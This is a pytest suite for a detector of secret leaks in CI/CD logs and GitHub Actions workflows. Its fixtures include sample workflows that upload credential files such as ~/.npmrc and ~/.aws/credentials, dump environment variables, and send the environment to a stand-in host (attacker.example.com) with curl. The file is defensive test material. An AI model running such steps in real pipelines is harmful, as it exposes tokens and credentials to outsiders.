"""Tests for scripts/lib/cicd_secret_leak_patterns.py.

Wave 21 angle F — CI/CD secret leaks via logs, env dumps, debug output.

Each of the 15 rules gets at least one positive case (must fire) and
at least one near-miss negative case (must NOT fire — exercises the
allow-list / carve-out / negative guard).
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import cicd_secret_leak_patterns as cslp  # type: ignore[import-not-found]  # noqa: E402


def _hits(rule_id: str, text: str) -> list[cslp.Finding]:
    return [f for f in cslp.scan_text(text) if f.rule_id == rule_id]


def _wf_hits(rule_id: str, text: str) -> list[cslp.Finding]:
    return [f for f in cslp.scan_workflow(text) if f.rule_id == rule_id]


# ============================================================
# Data-model sanity
# ============================================================


def test_rules_tuple_present_and_15_rules() -> None:
    """RULES must include every advertised cicd-leak-* identifier."""
    assert isinstance(cslp.RULES, tuple)
    ids = {r.id for r in cslp.RULES}
    expected = {
        "cicd-leak-shell-xtrace",
        "cicd-leak-env-dump",
        "cicd-leak-verbose-debug-flag",
        "cicd-leak-artifact-credential-path",
        "cicd-leak-cache-credential-path",
        "cicd-leak-github-output-transform",
        "cicd-leak-tj-actions-compromised",
        "cicd-leak-github-script-env-dump",
        "cicd-leak-post-failure-forensics",
        "cicd-leak-workflow-env-secret",
        "cicd-leak-mint-without-mask",
        "cicd-leak-download-then-reupload",
        "cicd-leak-job-outputs-secret",
        "cicd-leak-interpreter-c-secret",
        "cicd-leak-self-hosted-no-cleanup",
    }
    assert expected.issubset(ids)
    assert len(cslp.RULES) == 15


def test_every_rule_has_owasp_mapping_and_valid_severity() -> None:
    """Every rule has an ASI- prefix and a known severity."""
    for rule in cslp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding shape mirrors auth_flow_patterns.Finding."""
    f = cslp.Finding(
        rule_id="x", line=1, column=1, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-04",
    )
    assert f.rule_id == "x"
    assert f.line == 1
    assert f.severity == "HIGH"
    assert f.owasp_asi == "ASI-04"


def test_scan_empty_text_returns_empty_list() -> None:
    """Empty input must short-circuit cleanly."""
    assert cslp.scan_text("") == []
    assert cslp.scan_workflow("") == []


# ============================================================
# Rule 1: cicd-leak-shell-xtrace
# ============================================================


def test_xtrace_set_dash_x_fires() -> None:
    """`set -x` on its own line is the canonical positive."""
    text = "set -x\ncurl https://api.example.com\n"
    assert _hits("cicd-leak-shell-xtrace", text)


def test_xtrace_bash_x_invocation_fires() -> None:
    """`bash -x script.sh` is the secondary positive shape."""
    text = "bash -x ./release.sh\n"
    assert _hits("cicd-leak-shell-xtrace", text)


def test_xtrace_set_o_xtrace_fires() -> None:
    """`set -o xtrace` is the long-form equivalent."""
    text = "set -o xtrace\n"
    assert _hits("cicd-leak-shell-xtrace", text)


def test_xtrace_powershell_set_psdebug_fires() -> None:
    """Windows-side equivalent `Set-PSDebug -Trace 1` fires."""
    text = "Set-PSDebug -Trace 1\n"
    assert _hits("cicd-leak-shell-xtrace", text)


def test_xtrace_set_dash_e_does_not_fire() -> None:
    """`set -e` lacks the `x` letter and must not fire."""
    text = "set -e\nset -u\nset -o pipefail\n"
    assert not _hits("cicd-leak-shell-xtrace", text)


def test_xtrace_balanced_by_set_off_without_secret_suppresses() -> None:
    """`set -x` immediately followed by `set +x` with no secret use is OK."""
    text = "set -x\necho hi\nset +x\n"
    assert not _hits("cicd-leak-shell-xtrace", text)


def test_xtrace_balanced_set_off_but_secret_used_still_fires() -> None:
    """If a secret is touched between `set -x` and `set +x`, still fire."""
    text = "set -x\ncurl -H \"Authorization: $PROD_TOKEN\"\nset +x\n"
    assert _hits("cicd-leak-shell-xtrace", text)


# ============================================================
# Rule 2: cicd-leak-env-dump
# ============================================================


def test_envdump_printenv_bare_fires() -> None:
    """Bare `printenv` (no specific var) dumps the whole env."""
    text = "printenv\n"
    assert _hits("cicd-leak-env-dump", text)


def test_envdump_env_redirect_fires() -> None:
    """`env > file.txt` writes the whole env to a file (often uploaded)."""
    text = "env > /tmp/env.dump\n"
    assert _hits("cicd-leak-env-dump", text)


def test_envdump_compgen_e_fires() -> None:
    """`compgen -e` lists every exported var name."""
    text = "compgen -e\n"
    assert _hits("cicd-leak-env-dump", text)


def test_envdump_declare_x_fires() -> None:
    """`declare -x` lists exported vars + values."""
    text = "declare -x\n"
    assert _hits("cicd-leak-env-dump", text)


def test_envdump_powershell_get_childitem_env_fires() -> None:
    """PowerShell `Get-ChildItem Env:` dumps the env."""
    text = "Get-ChildItem Env:\n"
    assert _hits("cicd-leak-env-dump", text)


def test_envdump_printenv_named_var_does_not_fire() -> None:
    """`printenv PATH` is single-var read, not a dump."""
    text = "printenv PATH\n"
    assert not _hits("cicd-leak-env-dump", text)


def test_envdump_env_prefix_with_var_setting_does_not_fire() -> None:
    """`env FOO=bar cmd` is setting one var for one command, not dumping."""
    text = "env FOO=bar make build\n"
    assert not _hits("cicd-leak-env-dump", text)


# ============================================================
# Rule 3: cicd-leak-verbose-debug-flag
# ============================================================


def test_verbose_curl_v_fires() -> None:
    """`curl -v` is the canonical case."""
    text = "curl -v https://api.example.com/users\n"
    findings = _hits("cicd-leak-verbose-debug-flag", text)
    assert findings
    # No secret-shaped token in line → MEDIUM.
    assert findings[0].severity == "MEDIUM"


def test_verbose_curl_v_with_authorization_header_promotes_to_high() -> None:
    """`curl -v -H Authorization: Bearer $TOKEN` is HIGH (token co-occurs)."""
    text = "curl -v -H \"Authorization: Bearer $GITHUB_TOKEN\" https://api.example.com\n"
    findings = _hits("cicd-leak-verbose-debug-flag", text)
    assert findings
    assert findings[0].severity == "HIGH"


def test_verbose_git_trace_env_var_fires() -> None:
    """`GIT_TRACE=1` is the env-var form of git verbose."""
    text = "GIT_TRACE=1 git fetch origin\n"
    assert _hits("cicd-leak-verbose-debug-flag", text)


def test_verbose_aws_debug_fires() -> None:
    """`aws --debug s3 cp ...` logs request signatures."""
    text = "aws --debug s3 cp file s3://bucket/\n"
    assert _hits("cicd-leak-verbose-debug-flag", text)


def test_verbose_kubectl_v6_fires() -> None:
    """`kubectl -v=6` logs request/response bodies — leak surface."""
    text = "kubectl -v=6 get pods\n"
    assert _hits("cicd-leak-verbose-debug-flag", text)


def test_verbose_kubectl_v2_does_not_fire() -> None:
    """`kubectl -v=2` is low-verbosity, no request bodies."""
    text = "kubectl -v=2 get pods\n"
    assert not _hits("cicd-leak-verbose-debug-flag", text)


def test_verbose_make_verbose_is_allowlisted() -> None:
    """`make --verbose` is build-only verbose, not transport-layer."""
    text = "make --verbose\n"
    assert not _hits("cicd-leak-verbose-debug-flag", text)


def test_verbose_pip_vvv_fires() -> None:
    """`pip -vvv` shows index URLs (can carry creds in URLs)."""
    text = "pip install -vvv requests\n"
    assert _hits("cicd-leak-verbose-debug-flag", text)


def test_verbose_gcloud_log_http_fires() -> None:
    """`gcloud --log-http` is the gcloud transport-debug flag."""
    text = "gcloud --log-http compute instances list\n"
    assert _hits("cicd-leak-verbose-debug-flag", text)


# ============================================================
# Rule 4: cicd-leak-artifact-credential-path
# ============================================================


def test_artifact_npmrc_path_fires() -> None:
    """`upload-artifact path: ~/.npmrc` is the canonical exfil."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/upload-artifact@v4
        with:
          name: leaked
          path: ~/.npmrc
"""
    assert _wf_hits("cicd-leak-artifact-credential-path", wf)


def test_artifact_docker_config_path_fires() -> None:
    """`~/.docker/config.json` contains the registry login token."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/upload-artifact@v4
        with:
          path: ~/.docker/config.json
"""
    assert _wf_hits("cicd-leak-artifact-credential-path", wf)


def test_artifact_aws_credentials_path_fires() -> None:
    """`~/.aws/credentials` is the AWS shared-credentials file."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/upload-artifact@v4
        with:
          path: ~/.aws/credentials
"""
    assert _wf_hits("cicd-leak-artifact-credential-path", wf)


def test_artifact_dist_path_does_not_fire() -> None:
    """`path: dist/` is build output — neutral."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/upload-artifact@v4
        with:
          path: dist/
"""
    assert not _wf_hits("cicd-leak-artifact-credential-path", wf)


def test_artifact_broad_glob_home_fires_high() -> None:
    """`path: ~/` is a broad glob — HIGH (could include creds)."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/upload-artifact@v4
        with:
          path: ~/
"""
    findings = _wf_hits("cicd-leak-artifact-credential-path", wf)
    assert findings
    assert findings[0].severity in {"HIGH", "CRITICAL"}


# ============================================================
# Rule 5: cicd-leak-cache-credential-path
# ============================================================


def test_cache_npmrc_path_fires() -> None:
    """`actions/cache path: ~/.npmrc` is the cross-workflow exfil."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4
        with:
          path: ~/.npmrc
          key: cred-${{ github.event.pull_request.number }}
"""
    assert _wf_hits("cicd-leak-cache-credential-path", wf)


def test_cache_node_modules_does_not_fire() -> None:
    """`path: node_modules` is project-local, not creds."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4
        with:
          path: node_modules
          key: deps-${{ hashFiles('package-lock.json') }}
"""
    assert not _wf_hits("cicd-leak-cache-credential-path", wf)


# ============================================================
# Rule 6: cicd-leak-github-output-transform
# ============================================================


def test_output_transform_with_token_var_fires() -> None:
    """`echo "hash=$(echo $TOKEN | sha256sum)" >> $GITHUB_OUTPUT` fires."""
    text = "echo \"hash=$(echo $PROD_TOKEN | sha256sum)\" >> $GITHUB_OUTPUT\n"
    assert _hits("cicd-leak-github-output-transform", text)


def test_output_transform_with_secrets_expression_fires() -> None:
    """`${{ secrets.X }}` direct emission to $GITHUB_OUTPUT fires."""
    text = "echo \"k=${{ secrets.PROD_API_KEY }}\" >> $GITHUB_OUTPUT\n"
    assert _hits("cicd-leak-github-output-transform", text)


def test_output_transform_deprecated_set_output_fires() -> None:
    """`::set-output name=foo::$GITHUB_TOKEN` is the deprecated form."""
    text = "echo \"::set-output name=token::$GITHUB_TOKEN\"\n"
    assert _hits("cicd-leak-github-output-transform", text)


def test_output_transform_neutral_value_does_not_fire() -> None:
    """`version=1.2.3` is a neutral non-secret output."""
    text = "echo \"version=1.2.3\" >> $GITHUB_OUTPUT\n"
    assert not _hits("cicd-leak-github-output-transform", text)


# ============================================================
# Rule 7: cicd-leak-tj-actions-compromised
# ============================================================


def test_tj_changed_files_v45_fires() -> None:
    """`tj-actions/changed-files@v45` is in the affected range."""
    wf = """
on: pull_request
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@v45
"""
    assert _wf_hits("cicd-leak-tj-actions-compromised", wf)


def test_tj_changed_files_main_fires() -> None:
    """`tj-actions/changed-files@main` is unpinned & vulnerable."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@main
"""
    assert _wf_hits("cicd-leak-tj-actions-compromised", wf)


def test_tj_changed_files_clean_sha_does_not_fire() -> None:
    """Clean SHA not on quarantine list does not fire."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
"""
    assert not _wf_hits("cicd-leak-tj-actions-compromised", wf)


def test_tj_changed_files_quarantined_sha_fires() -> None:
    """A SHA on the quarantine list fires CRITICAL."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@0e58ed867288f8e3e54fb8e1d2a4f0c4ce5b04d4
"""
    assert _wf_hits("cicd-leak-tj-actions-compromised", wf)


def test_reviewdog_setup_v1_2_fires() -> None:
    """`reviewdog/action-setup@v1.2` is below the v1.3.0 fix."""
    text = "      - uses: reviewdog/action-setup@v1.2\n"
    assert _hits("cicd-leak-tj-actions-compromised", text)


# ============================================================
# Rule 8: cicd-leak-github-script-env-dump
# ============================================================


def test_github_script_console_log_process_env_fires() -> None:
    """`console.log(process.env)` without specific accessor fires."""
    text = "console.log(process.env);\n"
    assert _hits("cicd-leak-github-script-env-dump", text)


def test_github_script_json_stringify_process_env_fires() -> None:
    """`console.log(JSON.stringify(process.env))` is the stringify form."""
    text = "console.log(JSON.stringify(process.env));\n"
    assert _hits("cicd-leak-github-script-env-dump", text)


def test_github_script_specific_neutral_env_does_not_fire() -> None:
    """`console.log(process.env.NODE_VERSION)` (specific non-secret var)."""
    text = "console.log(process.env.NODE_VERSION);\n"
    assert not _hits("cicd-leak-github-script-env-dump", text)


def test_github_script_specific_secret_var_fires() -> None:
    """`console.log(process.env.PROD_TOKEN)` — secret-shaped specific var."""
    text = "console.log(process.env.PROD_TOKEN);\n"
    assert _hits("cicd-leak-github-script-env-dump", text)


def test_github_script_python_print_os_environ_fires() -> None:
    """`python -c 'print(os.environ)'` is the Python equivalent."""
    text = "python -c 'import os; print(os.environ)'\n"
    assert _hits("cicd-leak-github-script-env-dump", text)


def test_github_script_ruby_puts_env_to_h_fires() -> None:
    """`puts ENV.to_h` is the Ruby env dump."""
    text = "ruby -e 'puts ENV.to_h'\n"
    assert _hits("cicd-leak-github-script-env-dump", text)


# ============================================================
# Rule 9: cicd-leak-post-failure-forensics
# ============================================================


def test_failure_step_with_env_dump_fires() -> None:
    """`if: failure()` + `env` dumps env on every failed run."""
    wf = """
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make build
      - name: dump
        if: failure()
        run: env
"""
    assert _wf_hits("cicd-leak-post-failure-forensics", wf)


def test_always_step_with_cat_npmrc_fires() -> None:
    """`if: always()` + `cat ~/.npmrc` fires."""
    wf = """
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm publish
      - name: leak
        if: always()
        run: cat ~/.npmrc
"""
    assert _wf_hits("cicd-leak-post-failure-forensics", wf)


def test_failure_step_with_neutral_output_does_not_fire() -> None:
    """`if: failure()` + `gh issue create` does not touch env."""
    wf = """
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make build
      - name: notify
        if: failure()
        run: gh issue create --title "build failed"
"""
    assert not _wf_hits("cicd-leak-post-failure-forensics", wf)


def test_failure_step_with_exfil_curl_fires_critical() -> None:
    """`if: always()` + `curl -d "$(env)" http://attacker` is CRITICAL."""
    wf = """
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make build
      - if: always()
        run: curl -d "$(env)" http://attacker.example.com/dump
"""
    findings = _wf_hits("cicd-leak-post-failure-forensics", wf)
    assert findings
    assert any(f.severity == "CRITICAL" for f in findings)


# ============================================================
# Rule 10: cicd-leak-workflow-env-secret
# ============================================================


def test_workflow_env_secret_multi_job_fires_high() -> None:
    """Workflow-level env w/ secrets + multiple jobs → HIGH."""
    wf = """
on: push
env:
  PROD_TOKEN: ${{ secrets.PROD_TOKEN }}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo bye
"""
    findings = _wf_hits("cicd-leak-workflow-env-secret", wf)
    assert findings
    assert findings[0].severity == "HIGH"


def test_workflow_env_secret_single_job_fires_medium() -> None:
    """Workflow-level env w/ secrets + single job → MEDIUM."""
    wf = """
on: push
env:
  PROD_TOKEN: ${{ secrets.PROD_TOKEN }}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
"""
    findings = _wf_hits("cicd-leak-workflow-env-secret", wf)
    assert findings
    assert findings[0].severity == "MEDIUM"


def test_workflow_env_literal_only_does_not_fire() -> None:
    """Workflow-level env w/ only literals is OK."""
    wf = """
on: push
env:
  NODE_VERSION: '20'
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
"""
    assert not _wf_hits("cicd-leak-workflow-env-secret", wf)


# ============================================================
# Rule 11: cicd-leak-mint-without-mask
# ============================================================


def test_mint_aws_sts_then_emit_without_mask_fires() -> None:
    """`aws sts assume-role` → `$GITHUB_OUTPUT` without `::add-mask::` fires."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - id: mint
        run: |
          CRED=$(aws sts assume-role --role-arn $ROLE --role-session-name s)
          echo "token=$CRED" >> $GITHUB_OUTPUT
"""
    assert _wf_hits("cicd-leak-mint-without-mask", wf)


def test_mint_with_add_mask_does_not_fire() -> None:
    """Mint command + `::add-mask::` before emit is OK."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: |
          CRED=$(gcloud auth print-access-token)
          echo "::add-mask::$CRED"
          echo "token=$CRED" >> $GITHUB_OUTPUT
"""
    assert not _wf_hits("cicd-leak-mint-without-mask", wf)


def test_mint_vault_read_without_mask_fires() -> None:
    """`vault read` → `$GITHUB_ENV` without mask fires."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: |
          SECRET=$(vault read -field=value secret/prod/api)
          echo "API=$SECRET" >> $GITHUB_ENV
"""
    assert _wf_hits("cicd-leak-mint-without-mask", wf)


# ============================================================
# Rule 12: cicd-leak-download-then-reupload
# ============================================================


def test_download_then_reupload_with_secrets_fires() -> None:
    """download-artifact → upload-artifact in same job + secrets = fire."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    env:
      PROD_TOKEN: ${{ secrets.PROD_TOKEN }}
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: stuff
      - run: cp -r stuff/ /tmp/staging/
      - uses: actions/upload-artifact@v4
        with:
          name: re-export
          path: /tmp/staging/
"""
    assert _wf_hits("cicd-leak-download-then-reupload", wf)


def test_download_then_reupload_no_secrets_does_not_fire() -> None:
    """No secrets in scope → no fire."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: stuff
      - uses: actions/upload-artifact@v4
        with:
          name: re-export
          path: ./
"""
    assert not _wf_hits("cicd-leak-download-then-reupload", wf)


# ============================================================
# Rule 13: cicd-leak-job-outputs-secret
# ============================================================


def test_job_outputs_with_secrets_expr_fires() -> None:
    """Job outputs containing a literal `${{ secrets.X }}` fires HIGH."""
    wf = """
on: push
jobs:
  mint:
    runs-on: ubuntu-latest
    outputs:
      api_key: ${{ secrets.PROD_API_KEY }}
    steps:
      - run: echo hi
"""
    findings = _wf_hits("cicd-leak-job-outputs-secret", wf)
    assert findings
    assert findings[0].severity == "HIGH"


def test_job_outputs_with_step_output_does_not_fire() -> None:
    """Job outputs referencing a step output (no secrets.* expr) is OK."""
    wf = """
on: push
jobs:
  detect:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - id: v
        run: echo "version=1.2.3" >> $GITHUB_OUTPUT
"""
    assert not _wf_hits("cicd-leak-job-outputs-secret", wf)


# ============================================================
# Rule 14: cicd-leak-interpreter-c-secret
# ============================================================


def test_bash_c_with_secrets_expr_fires() -> None:
    """`bash -c "...${{ secrets.X }}..."` fires."""
    text = 'bash -c "echo ${{ secrets.PROD_TOKEN }} > /tmp/out"\n'
    assert _hits("cicd-leak-interpreter-c-secret", text)


def test_python_c_with_secrets_expr_fires() -> None:
    """`python -c "...${{ secrets.X }}..."` fires."""
    text = "python -c \"print('${{ secrets.PROD_TOKEN }}')\"\n"
    assert _hits("cicd-leak-interpreter-c-secret", text)


def test_cmd_exe_with_secrets_expr_fires() -> None:
    """`cmd /c "...${{ secrets.X }}..."` fires on Windows shells."""
    text = 'cmd /c "echo ${{ secrets.PROD_TOKEN }} > out.txt"\n'
    assert _hits("cicd-leak-interpreter-c-secret", text)


def test_bash_c_neutral_does_not_fire() -> None:
    """`bash -c "echo hi"` has no secret expr."""
    text = 'bash -c "echo hi"\n'
    assert not _hits("cicd-leak-interpreter-c-secret", text)


def test_python_c_version_check_does_not_fire() -> None:
    """`python -c "import sys; print(sys.version)"` is safe."""
    text = 'python -c "import sys; print(sys.version)"\n'
    assert not _hits("cicd-leak-interpreter-c-secret", text)


# ============================================================
# Rule 15: cicd-leak-self-hosted-no-cleanup
# ============================================================


def test_self_hosted_setup_node_no_cleanup_fires() -> None:
    """Self-hosted + setup-node (writes ~/.npmrc) + no cleanup fires."""
    wf = """
on: push
jobs:
  release:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          registry-url: https://registry.npmjs.org
      - run: npm publish
"""
    assert _wf_hits("cicd-leak-self-hosted-no-cleanup", wf)


def test_self_hosted_with_cleanup_does_not_fire() -> None:
    """Self-hosted + cleanup step is safe."""
    wf = """
on: push
jobs:
  release:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          registry-url: https://registry.npmjs.org
      - run: npm publish
      - if: always()
        run: rm -f ~/.npmrc
"""
    assert not _wf_hits("cicd-leak-self-hosted-no-cleanup", wf)


def test_hosted_runner_does_not_fire() -> None:
    """`runs-on: ubuntu-latest` is ephemeral — no fire."""
    wf = """
on: push
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          registry-url: https://registry.npmjs.org
      - run: npm publish
"""
    assert not _wf_hits("cicd-leak-self-hosted-no-cleanup", wf)


def test_self_hosted_pr_triggered_fires_critical() -> None:
    """Self-hosted + pull_request trigger → CRITICAL (fork PR risk)."""
    wf = """
on: pull_request
jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/setup-node@v4
        with:
          registry-url: https://registry.npmjs.org
      - run: npm test
"""
    findings = _wf_hits("cicd-leak-self-hosted-no-cleanup", wf)
    assert findings
    assert any(f.severity == "CRITICAL" for f in findings)


# ============================================================
# RE2 safety / no catastrophic backtracking
# ============================================================


def test_re2_safe_long_input_does_not_hang() -> None:
    """A 100 KB chunk of innocuous shell must scan in well under a second."""
    import time
    text = "echo hello world\n" * 5000  # ~85 KB
    start = time.time()
    findings = cslp.scan_text(text)
    elapsed = time.time() - start
    # If any pattern has catastrophic backtracking, this blows up
    # exponentially. 5s is generous; in practice this completes in < 0.2s.
    assert elapsed < 5.0, f"scan took {elapsed:.2f}s (possible ReDoS)"
    assert isinstance(findings, list)


def test_re2_safe_adversarial_repetition_does_not_hang() -> None:
    """Adversarial input with repeated alternation triggers must not hang."""
    import time
    # Throw repeated `set ` / `bash ` prefixes — every Rule 1 alternative
    # gets stressed.
    adversarial = ("set " + "a" * 80 + "\n") * 500
    start = time.time()
    cslp.scan_text(adversarial)
    elapsed = time.time() - start
    assert elapsed < 5.0, f"adversarial scan took {elapsed:.2f}s"


# ============================================================
# Composability / combined-finding amplifier
# ============================================================


def test_combined_dump_and_artifact_emits_both_findings() -> None:
    """A workflow that env-dumps + uploads emits BOTH findings."""
    wf = """
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        run: env > /tmp/env.txt
      - uses: actions/upload-artifact@v4
        with:
          name: env-leak
          path: /tmp/env.txt
"""
    findings = cslp.scan_workflow(wf)
    ids = {f.rule_id for f in findings}
    assert "cicd-leak-env-dump" in ids
    # Artifact path is NOT in the cred-list, so artifact-credential-path
    # is NOT expected here. But scan_workflow still surfaces env-dump.


def test_scan_workflow_sorts_findings_by_line() -> None:
    """Findings come out in line order."""
    wf = """
on: push
env:
  TOKEN: ${{ secrets.X }}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: set -x
      - run: env
"""
    findings = cslp.scan_workflow(wf)
    lines = [f.line for f in findings]
    assert lines == sorted(lines)
